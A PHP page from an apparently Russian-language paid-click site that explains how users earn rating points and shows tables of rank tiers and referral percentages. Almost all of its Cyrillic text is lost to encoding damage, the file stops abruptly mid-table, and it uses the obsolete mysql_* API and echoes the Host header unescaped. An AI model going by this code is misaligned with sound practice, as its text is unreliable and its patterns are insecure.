<?php
$pagetitle="��������� ���� �� ".$_SERVER["HTTP_HOST"];
require_once('.zsecurity.php');
include('header.php');

if(!isset($_SESSION["userLog"], $_SESSION["userPas"])) {
	echo '<span class="msg-error">������! ��� ������� � ���� �������� ���������� ��������������!</span>';
}else{
	function CntTxt($count, $text1, $text2, $text3) {
		if($count>=0) {
			if( ($count>=10 && $count<=20) | (substr($count, -2, 2)>=10 && substr($count, -2, 2)<=20) ) {
				return "<b>$count</b> $text3";
			}else{
				switch(substr($count, -1, 1)){
					case 1: return "<b>$count</b> $text1"; break;
					case 2: case 3: case 4: return "<b>$count</b> $text2"; break;
					case 5: case 6: case 7: case 8: case 9: case 0: return "<b>$count</b> $text3"; break;
				}
			}
		}
	}

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_as' AND `howmany`='1'");
	$reit_as = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_as_you' AND `howmany`='1'");
	$reit_as_you = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ds' AND `howmany`='1'");
	$reit_ds = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_you' AND `howmany`='1'");
	$reit_you = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_mails' AND `howmany`='1'");
	$reit_mails = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_dl' AND `howmany`='1'");
	$reit_dl = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_task' AND `howmany`='1'");
	$reit_task = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ref' AND `howmany`='1'");
	$reit_ref = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_rek'");
	$reit_rek = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_vip' AND `howmany`='1'");
	$reit_vip = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ref_rek'");
	$reit_ref_rek = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_active' AND `howmany`='1'");
	$reit_active = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_noactive' AND `howmany`='1'");
	$reit_noactive = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ban' AND `howmany`='1'");
	$reit_ban = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='tests_reiting' AND `howmany`='1'");
	$tests_reiting = mysql_result($sql,0,0);

        $sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='cena_board_reit'");
	$cena_board_reit = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_kop'");
				$reit_kop = mysql_result($sql,0,0);

        //echo '<div style="color:#0000ff; font-size:12px;box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.6); padding:10px; margin:10px;background:#efe1fb" align="justify"> ';
	echo '<div style="/*color: #bb2ca7;*/font-size:12px;box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.6);padding:10px;margin:10px;background: #f7e9e3;" align="justify">';
		echo '<b style="color:#E54100; margin-left:20px;">'.strtoupper($_SERVER["HTTP_HOST"]).'</b> ���� ����������� ������������. � ��� ������, ��� ������ ���� � ��������� ����! ������ ������������ �� ������� ����� ������� ���� �������, ���������� ���� ��������� � ����. ������� ��������� ���������� ����� - ��� <b>�������</b>. ��� ���� ������� - ��� ���� ������, ������ �����������, ������ ���������. ���� �������� �������, �������� �������� ������������ <b style="color:#E54100;">'.strtoupper($_SERVER["HTTP_HOST"]).'</b> � ������������, ������� ��� ������� ����.';
	

	echo '<h2 class="sp">��� �������������� �������?</h2>';
	echo '<div style="text-align: justify;">';
		echo '<b style="margin-left:20px;">�������</b> - ������ ������������ ������ ���������� �����. ��� ���������� ����� ��������? ����� �� ��� �����������? �������� ��������, ��� �������������� �������:';
	echo '</div>';

	echo '<ul class="green">';

		echo '<li>�������� ������ � ��������: <b>+'.number_format($reit_ds,2,'.','`').' �����</b></li>';
		echo '<li>�������� ����������� � �������� <span style="color: #3F3F3F;">You</span><span style="border-radius: 5px; background-color: #E62117; padding: 2px; color: #FFFFFF;">Tube</span>: <b>+'.number_format($reit_you,2,'.','`').' �����</b></li>';
		echo '<li>�������� ������ � ����-��������: <b>+'.number_format($reit_as,2,'.','`').' �����</b></li>';
		echo '<li>�������� ������ � ����-�������� <span style="color: #3F3F3F;">You</span><span style="border-radius: 5px; background-color: #E62117; padding: 2px; color: #FFFFFF;">Tube</span>: <b>+'.number_format($reit_as_you,2,'.','`').' �����</b></li>';
		echo '<li>����������� �����: <b>+'.number_format($tests_reiting,2,'.','`').' �����</b></li>';
		echo '<li>��������� ���������� ������: <b>+'.number_format($reit_mails,2,'.','`').' �����</b></li>';
		//echo '<li>���������� ����� (������� ����������): <b>+'.number_format($reit_dl,2,'.','`').' �����</b></li>';
		echo '<li>���������� ������� �������������: <b>+'.number_format($reit_task,2,'.','`').' �����</b></li>';
		echo '<li>����������� ��������: <b>+'.number_format($reit_ref,2,'.','`').' �����</b></li>';
		echo '<li>�� ���������� ����������: <b>+'.number_format($reit_active,2,'.','`').' �����</b></li>';
		echo '<li>�� ������ ������ <b>10 ���.</b> ����������� �� ���������� ������� ������� �����������: <b>+'.number_format($reit_kop,2,'.','`').' ������</b></li>';
		echo '<li>�� ������ ���������� ������� �� ����� ������:  <b>+'.number_format($cena_board_reit,2,'.','`').' �����</b></li>';
               	echo '<li>�� ������ ������ 10 ��� ����������� �� ������ ������� � ���������� ����� <span style="color: #ff7f50;"><b>[����� ������ �������]</b></span>: <b>+'.number_format($reit_rek,2,'.','`').' �����</b></li>';
               	echo '<li>�� ���������� <span style="color:#DE1200">VIP-������ � ��������</span>: <b>+'.number_format($reit_vip,2,'.','`').' ����</b></li>';
               	echo '<li>�� ���������� <span style="color:#DE1200">VIP-������� � ��������</span>: <b>+'.number_format($reit_vip,2,'.','`').' ������</b></li>';
               	echo '<li>�� ���������� <span style="color:#DE1200">VIP-������ � ��������</span> <span style="color: #3F3F3F;">You</span><span style="border-radius: 5px; background-color: #E62117; padding: 2px; color: #FFFFFF;">Tube</span>: <b>+'.number_format($reit_vip,2,'.','`').' ����</b></li>';
		echo '<li>�� ������ ������ 10 ��� ����������� ��������� �� ������ ������� � ���������� �����: <b>+'.number_format($reit_ref_rek,2,'.','`').' �����</b></li>';
		
	echo '</ul>';
	echo '<ul class="red">';
		echo '<li>���������� ���������� � ������� ������(7 ����): <b>-'.number_format(abs($reit_noactive),2,'.','`').' ������</b></li>';
		echo '<li>��� �� ������: <b>-'.number_format(abs($reit_ban),2,'.','`').' ������</b></li>';
	echo '</ul>';

	$sql = mysql_query("SELECT * FROM `tb_config_rang` ORDER BY `id` ASC");
	if(mysql_num_rows($sql)>0) {
		while ($row = mysql_fetch_array($sql)) {
			$rang_arr[] = $row["rang"];
			$r_ot_arr[] = $row["r_ot"];
			$r_do_arr[] = $row["r_do"];
			$r_c_1_arr[] = $row["c_1"];
			$r_c_2_arr[] = $row["c_2"];
			$r_c_3_arr[] = $row["c_3"];
			//$r_c_4_arr[] = $row["c_4"];
			//$r_c_5_arr[] = $row["c_5"];
			$r_m_1_arr[] = $row["m_1"];
			$r_m_2_arr[] = $row["m_2"];
			$r_m_3_arr[] = $row["m_3"];
			//$r_m_4_arr[] = $row["m_4"];
			//$r_m_5_arr[] = $row["m_5"];
			$r_t_1_arr[] = $row["t_1"];
			$r_t_2_arr[] = $row["t_2"];
			$r_t_3_arr[] = $row["t_3"];
			//$r_t_4_arr[] = $row["t_4"];
			//$r_t_5_arr[] = $row["t_5"];
			$r_test_1_arr[] = $row["test_1"];
			$r_test_2_arr[] = $row["test_2"];
			$r_test_3_arr[] = $row["test_3"];
			//$r_test_4_arr[] = $row["test_4"];
			//$r_test_5_arr[] = $row["test_5"];
			$r_youtube_1_arr[] = $row["youtube_1"];
			$r_youtube_2_arr[] = $row["youtube_2"];
			$r_youtube_3_arr[] = $row["youtube_3"];
			//$r_youtube_4_arr[] = $row["youtube_4"];
			//$r_youtube_5_arr[] = $row["youtube_5"];
			$r_pv_1_arr[] = $row["pv_1"];
			$r_pv_2_arr[] = $row["pv_2"];
			$r_pv_3_arr[] = $row["pv_3"];
			//$r_pv_4_arr[] = $row["pv_4"];
			//$r_pv_5_arr[] = $row["pv_5"];
			$r_balance_1_arr[] = $row["balance_1"];
			$wall_comm_arr[] = $row["wall_comm"];
			$max_pay_arr[] = round($row["max_pay"],2);
			$pay_min_click_arr[] = $row["pay_min_click"];
			
		}
	}


	echo '<h2 class="sp">�������</h2>';
	echo '<div style="text-align: justify;">';
		echo '<span style="margin-left:20px;">���</span> ��������� ������������ ���������� ����� ������������ ������������ �������. ��� ������� ������ ������. ������� ����������� ��������� � ������������� ��� ���������� ������������� ����������� �������. ������� ��������� � �� �������� �� ��������, ���� ������������ �� ������ �������. ����� ���: "'.$rang_arr[0].'", "'.$rang_arr[1].'", "'.$rang_arr[2].'", "'.$rang_arr[3].'", "'.$rang_arr[4].'", "'.$rang_arr[5].'".';
	echo '</div>';

	echo '<h5 class="sp">������: "'.$rang_arr[0].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[0].'" �������� ��� ������������, ����� ����� ����������� ��������� ����������� �� �������. ��� ����� ��������� � ����� ����������� ������. ������������ �� �������� "'.$rang_arr[0].'" �� �������� ����������� ���������� �� ��������� II,III ������.';
	echo '</div>';

	echo '<h5 class="sp">������: "'.$rang_arr[1].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[1].'" ��� �������� ������ � �������. ������������ �� �������� "'.$rang_arr[1].'" �������� ����������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[1].'", ����� ������� ����� '.$r_ot_arr[1].' ������ ��������.</span>';
	echo '</div>';

	echo '<h5 class="sp">������: "'.$rang_arr[2].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[2].'" ��� ���������� ������ � �������. �� ��������� �� "'.$rang_arr[1].'", "'.$rang_arr[2].'" �������� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[2].'", ����� ������� '.$r_ot_arr[2].' ������ ��������.</span>';
	echo '</div>';

	echo '<h5 class="sp">������: "'.$rang_arr[3].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[3].'" ��� ���������� ������ � �������. ������������ �� �������� "'.$rang_arr[3].'" �������� ����� �������������� ������� "'.$rang_arr[2].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[3].'", ����� ������� '.$r_ot_arr[3].' ������ ��������.</span>';
	echo '</div>';

	echo '<h5 class="sp">������: "'.$rang_arr[4].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[4].'" ��� ���������� ������ � �������. ������������ �� �������� "'.$rang_arr[4].'" �������� ����� �������������� ������� "'.$rang_arr[3].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[4].'", ����� ������� '.$r_ot_arr[4].' ������ ��������.</span>';
	echo '</div>';

	echo '<h5 class="sp">������: "'.$rang_arr[5].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[5].'" ��� ������������ ������ � �������. ������������ �� �������� "'.$rang_arr[5].'" �������� ����� �������������� ������� "'.$rang_arr[4].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[5].'", ����� ������� '.$r_ot_arr[5].' ������ ��������.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">������: "'.$rang_arr[6].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[6].'" ��� ���������� ������ � �������. ������������ �� �������� "'.$rang_arr[6].'" �������� ����� �������������� ������� "'.$rang_arr[5].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[6].'", ����� ������� '.$r_ot_arr[6].' ������ ��������.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">������: "'.$rang_arr[7].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[7].'" ��� ���������� ������ � �������. ������������ �� �������� "'.$rang_arr[7].'" �������� ����� �������������� ������� "'.$rang_arr[6].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[7].'", ����� ������� '.$r_ot_arr[7].' ������ ��������.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">������: "'.$rang_arr[8].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[8].'" ��� ���������� ������ � �������. ������������ �� �������� "'.$rang_arr[8].'" �������� ����� �������������� ������� "'.$rang_arr[7].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[8].'", ����� ������� '.$r_ot_arr[8].' ������ ��������.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">������: "'.$rang_arr[9].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[9].'" ��� ������������ ������ � �������. ������������ �� �������� "'.$rang_arr[9].'" �������� ����� �������������� ������� "'.$rang_arr[8].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[9].'", ����� ������� '.$r_ot_arr[9].' ������ ��������.</span>';
	
	/*echo '<h5 class="sp">������: "'.$rang_arr[10].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[10].'" ��� ���������� ������ � �������. ������������ �� �������� "'.$rang_arr[10].'" �������� ����� �������������� ������� "'.$rang_arr[9].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[10].'", ����� ������� '.$r_ot_arr[10].' ������ ��������.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">������: "'.$rang_arr[11].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo '������ "'.$rang_arr[11].'" ��� ������������ ������ � �������. ������������ �� �������� "'.$rang_arr[11].'" �������� ����� �������������� ������� "'.$rang_arr[10].'", �� ����� ���������� ����������� ����������. <span style="color: #FF0000;">��� ��������� ������� "'.$rang_arr[11].'", ����� ������� '.$r_ot_arr[11].' ������ ��������.</span>';
*/

	echo '<h2 class="sp">������������� ������� ��������</h2>';

	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">������:</th>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[0].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[1].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[2].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">�������:</th>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">-</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[1].' - '.$r_do_arr[1].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[2].' - '.$r_do_arr[2].'</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�����)</td>';
			echo '<td align="center">'.$r_c_1_arr[0].'% - '.$r_c_2_arr[0].'% - '.$r_c_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[1].'% - '.$r_c_2_arr[1].'% - '.$r_c_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[2].'% - '.$r_c_2_arr[2].'% - '.$r_c_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[0].'% - '.$r_youtube_2_arr[0].'% - '.$r_youtube_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[1].'% - '.$r_youtube_2_arr[1].'% - '.$r_youtube_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[2].'% - '.$r_youtube_2_arr[2].'% - '.$r_youtube_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(������)</td>';
			echo '<td align="center">'.$r_m_1_arr[0].'% - '.$r_m_2_arr[0].'% - '.$r_m_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[1].'% - '.$r_m_2_arr[1].'% - '.$r_m_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[2].'% - '.$r_m_2_arr[2].'% - '.$r_m_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�������)</td>';
			echo '<td align="center">'.$r_t_1_arr[0].'% - '.$r_t_2_arr[0].'% - '.$r_t_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[1].'% - '.$r_t_2_arr[1].'% - '.$r_t_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[2].'% - '.$r_t_2_arr[2].'% - '.$r_t_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[�����]</td>';
			echo '<td align="center">'.$r_test_1_arr[0].'% - '.$r_test_2_arr[0].'% - '.$r_test_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[1].'% - '.$r_test_2_arr[1].'% - '.$r_test_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[2].'% - '.$r_test_2_arr[2].'% - '.$r_test_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[���������]<br>(% �� ������ �����)</td>';
			echo '<td align="center">'.$r_pv_1_arr[0].'% - '.$r_pv_2_arr[0].'% - '.$r_pv_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[1].'% - '.$r_pv_2_arr[1].'% - '.$r_pv_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[2].'% - '.$r_pv_2_arr[2].'% - '.$r_pv_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �������<br>[������������ ����� � �����]</td>';
			echo '<td align="center">'.$max_pay_arr[0].' ���.</td>';
			echo '<td align="center">'.$max_pay_arr[1].' ���.</td>';
			echo '<td align="center">'.$max_pay_arr[2].' ���.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">���-�� �������� ��� ������ [������� � �����]</td>';
			echo '<td align="center">'.($pay_min_click_arr[0]>0 ? $pay_min_click_arr[0] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[1]>0 ? $pay_min_click_arr[1] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[2]>0 ? $pay_min_click_arr[2] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I ������<br><span style="font-size:10px">[�� ���������� ���������� �������]<br>[� ������� ��������� ������]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[0]>0 ? $r_balance_1_arr[0]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[1]>0 ? $r_balance_1_arr[1]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[2]>0 ? $r_balance_1_arr[2]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����������� ��������� ������<br>�� "������" �������������</td>';
			echo '<td align="center">'.($wall_comm_arr[0]==1 ? "��" : "���").'</td>';
			echo '<td align="center">'.($wall_comm_arr[1]==1 ? "��" : "���").'</td>';
			echo '<td align="center">'.($wall_comm_arr[2]==1 ? "��" : "���").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table><br><br>';

	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">������:</th>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[3].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[4].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[5].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">�������:</th>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[3].' - '.$r_do_arr[3].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[4].' - '.$r_do_arr[4].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[5].' - '.$r_do_arr[5].'</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�����)</td>';
			echo '<td align="center">'.$r_c_1_arr[3].'% - '.$r_c_2_arr[3].'% - '.$r_c_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[4].'% - '.$r_c_2_arr[4].'% - '.$r_c_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[5].'% - '.$r_c_2_arr[5].'% - '.$r_c_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[3].'% - '.$r_youtube_2_arr[3].'% - '.$r_youtube_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[4].'% - '.$r_youtube_2_arr[4].'% - '.$r_youtube_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[5].'% - '.$r_youtube_2_arr[5].'% - '.$r_youtube_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(������)</td>';
			echo '<td align="center">'.$r_m_1_arr[3].'% - '.$r_m_2_arr[3].'% - '.$r_m_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[4].'% - '.$r_m_2_arr[4].'% - '.$r_m_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[5].'% - '.$r_m_2_arr[5].'% - '.$r_m_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�������)</td>';
			echo '<td align="center">'.$r_t_1_arr[3].'% - '.$r_t_2_arr[3].'% - '.$r_t_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[4].'% - '.$r_t_2_arr[4].'% - '.$r_t_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[5].'% - '.$r_t_2_arr[5].'% - '.$r_t_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>[�����]</td>';
			echo '<td align="center">'.$r_test_1_arr[3].'% - '.$r_test_2_arr[3].'% - '.$r_test_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[4].'% - '.$r_test_2_arr[4].'% - '.$r_test_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[5].'% - '.$r_test_2_arr[5].'% - '.$r_test_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[���������]<br>(% �� ������ �����)</td>';
			echo '<td align="center">'.$r_pv_1_arr[3].'% - '.$r_pv_2_arr[3].'% - '.$r_pv_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[4].'% - '.$r_pv_2_arr[4].'% - '.$r_pv_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[5].'% - '.$r_pv_2_arr[5].'% - '.$r_pv_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �������<br>[������������ ����� � �����]</td>';
			echo '<td align="center">'.$max_pay_arr[3].' ���.</td>';
			echo '<td align="center">'.$max_pay_arr[4].' ���.</td>';
			echo '<td align="center">'.$max_pay_arr[5].' ���.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">���-�� �������� ��� ������ [������� � �����]</td>';
			echo '<td align="center">'.($pay_min_click_arr[3]>0 ? $pay_min_click_arr[3] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[4]>0 ? $pay_min_click_arr[4] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[5]>0 ? $pay_min_click_arr[5] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I ������<br><span style="font-size:10px">[�� ���������� ���������� �������]<br>[� ������� ��������� ������]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[3]>0 ? $r_balance_1_arr[3]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[4]>0 ? $r_balance_1_arr[4]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[5]>0 ? $r_balance_1_arr[5]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����������� ��������� ������<br>�� "������" �������������</td>';
			echo '<td align="center">'.($wall_comm_arr[3]==1 ? "��" : "���").'</td>';
			echo '<td align="center">'.($wall_comm_arr[4]==1 ? "��" : "���").'</td>';
			echo '<td align="center">'.($wall_comm_arr[5]==1 ? "��" : "���").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table><br><br>';
	
	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">������:</th>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[6].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[7].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[8].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">�������:</th>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[6].' - '.$r_do_arr[6].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[7].' - '.$r_do_arr[7].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[8].' - '.$r_do_arr[8].'</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�����)</td>';
			echo '<td align="center">'.$r_c_1_arr[6].'% - '.$r_c_2_arr[6].'% - '.$r_c_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[7].'% - '.$r_c_2_arr[7].'% - '.$r_c_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[8].'% - '.$r_c_2_arr[8].'% - '.$r_c_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[YouTube]</td>';
